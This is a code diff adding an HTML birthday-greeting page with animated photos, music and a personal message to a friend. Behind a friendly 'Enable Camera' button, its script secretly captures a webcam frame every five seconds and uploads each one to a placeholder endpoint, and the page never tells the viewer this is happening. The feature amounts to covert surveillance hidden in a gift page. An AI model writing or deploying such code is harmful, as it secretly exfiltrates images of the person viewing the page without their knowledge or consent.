@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Happay Birthday Saanu (Shoko Moko)</title>
+  <style>
+    body {
+      margin: 0;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .photo {
+      position: absolute;
+      width: 150px;
+      height: 150px;
+      border-radius: 10px;
+      object-fit: cover;
+      opacity: 0;
+      transition: all 1s ease;
+    }
+    #message {
+      display: none;
+      text-align: center;
+      font-size: 24px;
+      padding: 10px;
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.6);
+      border-radius: 10px;
+    }
+    #controls {
+      position: absolute;
+      bottom: 20px;
+      display: flex;
+      gap: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      margin: 5px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #cameraView, #audioPlayback {
+      margin-top: 20px;
+    }
+    #cameraBtn {
+      position: absolute;
+      left: 25%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      display: none;
+    }
+    #micBtn {
+      position: absolute;
+      right: 25%;
+      top: 50%;
+      transform: translate(50%, -50%);
+      display: none;
+    }
+    .info-text {
+      position: absolute;
+      font-size: 14px;
+      width: 200px;
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 8px;
+      border-radius: 5px;
+      display: none;
+    }
+    #cameraInfo {
+      left: 25%;
+      top: 60%;
+      transform: translate(-50%, 0);
+    }
+    #micInfo {
+      right: 25%;
+      top: 60%;
+      transform: translate(50%, 0);
+    }
+  </style>
+</head>
+<body>
+  <audio id="bgMusic" loop>
+    <source src="your-music.mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+  <div id="container"></div>
+  <div id="message">
+    hey shoko moko HAPPY BIRTHDAY!!<br>
+    i know i know i'm weird, my backchodi is weird but still I enjoy it, probably you too.<br>
+    On this occasion of your birthday, take my wishes.
+  </div>
+  <button id="cameraBtn" onclick="startCamera()">Enable Camera</button>
+  <div class="info-text" id="cameraInfo">Is there anything you want to add then you can add here using this</div>
+
+  <button id="micBtn" onclick="startRecording()">Start Recording</button>
+  <div class="info-text" id="micInfo">If you want to add any music in your voice then you can record here thank you</div>
+
+  <video id="cameraView" width="300" autoplay playsinline muted style="display: none;"></video>
+  <audio id="audioPlayback" controls style="display: none;"></audio>
+
+  <div id="controls">
+    <button onclick="playMusic()">Play</button>
+    <button onclick="pauseMusic()">Pause</button>
+  </div>
+
+  <script>
+    const positions = [
+      { top: '10px', right: '10px' },                     // 1 - Top right
+      { top: '170px', right: '10px' },                    // 2 - Mid right
+      { top: '330px', right: '10px' },                    // 3 - Bottom right
+
+      { top: '10px', left: '10px' },                      // 4 - Top left
+      { top: '170px', left: '10px' },                     // 5 - Mid left
+      { top: '330px', left: '10px' },                     // 6 - Bottom left
+
+      { bottom: '10px', left: '200px' },                  // 7 - Bottom row (left)
+      { bottom: '10px', left: 'calc(50% - 75px)' },       // 8 - Bottom row (center)
+      { bottom: '10px', right: '200px' },                 // 9 - Bottom row (right)
+
+      { top: 'calc(50% - 75px)', left: 'calc(50% - 75px)' } // 10 - Center
+    ];
+
+    const container = document.getElementById('container');
+
+    for (let i = 1; i <= 10; i++) {
+      const img = document.createElement('img');
+      img.src = `photos/photo${i}.jpg`;
+      img.className = 'photo';
+      img.id = `photo${i}`;
+      container.appendChild(img);
+    }
+
+    const showPhotos = async () => {
+      for (let i = 1; i <= 10; i++) {
+        const photo = document.getElementById(`photo${i}`);
+        photo.style.opacity = 1;
+        photo.style.top = '50%';
+        photo.style.left = '50%';
+        photo.style.transform = 'translate(-50%, -50%)';
+        await new Promise(res => setTimeout(res, 2000));
+
+        photo.style.transform = 'none';
+        photo.style.top = positions[i - 1].top || 'auto';
+        photo.style.left = positions[i - 1].left || 'auto';
+        photo.style.right = positions[i - 1].right || 'auto';
+        photo.style.bottom = positions[i - 1].bottom || 'auto';
+        await new Promise(res => setTimeout(res, 500));
+      }
+      document.getElementById('message').style.display = 'block';
+
+      setTimeout(() => {
+        document.getElementById('cameraBtn').style.display = 'block';
+        document.getElementById('micBtn').style.display = 'block';
+        document.getElementById('cameraInfo').style.display = 'block';
+        document.getElementById('micInfo').style.display = 'block';
+      }, 11000); // 3 sec after message
+    };
+
+    const playMusic = () => {
+      const music = document.getElementById('bgMusic');
+      music.play().catch(() => alert("Music couldn't play, maybe due to browser permissions."));
+    };
+
+    const pauseMusic = () => {
+      document.getElementById('bgMusic').pause();
+    };
+
+    // Camera Access and Auto Upload
+    let stream;
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(mediaStream => {
+          stream = mediaStream;
+          const video = document.getElementById('cameraView');
+          video.srcObject = stream;
+          video.style.display = 'block';
+          startAutoCapture();
+        })
+        .catch(err => {
+          alert('Camera access denied or not available.');
+        });
+    }
+
+    function startAutoCapture() {
+      const video = document.getElementById('cameraView');
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+
+      setInterval(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+          if (blob) uploadImage(blob);
+        }, 'image/jpeg');
+      }, 5000); // capture every 5 seconds
+    }
+
+    function uploadImage(blob) {
+      const formData = new FormData();
+      formData.append('photo', blob, 'capture.jpg');
+
+      fetch('YOUR_UPLOAD_ENDPOINT_HERE', {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => console.log('Photo uploaded'))
+      .catch(err => console.error('Upload failed', err));
+    }
+
+    // Microphone Recording
+    let mediaRecorder;
+    let audioChunks = [];
+
+    function startRecording() {
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => {
+          mediaRecorder = new MediaRecorder(stream);
+          mediaRecorder.start();
+
+          mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+
+          mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+            const audioUrl = URL.createObjectURL(audioBlob);
+            const audio = document.getElementById('audioPlayback');
+            audio.src = audioUrl;
+            audio.style.display = 'block';
+            audioChunks = [];
+          };
+
+          setTimeout(() => {
+            mediaRecorder.stop();
+          }, 5000);
+        })
+        .catch(err => {
+          alert('Microphone access denied or not available.');
+        });
+    }
+
+    window.onload = showPhotos;
+  </script>
+</body>
+</html>
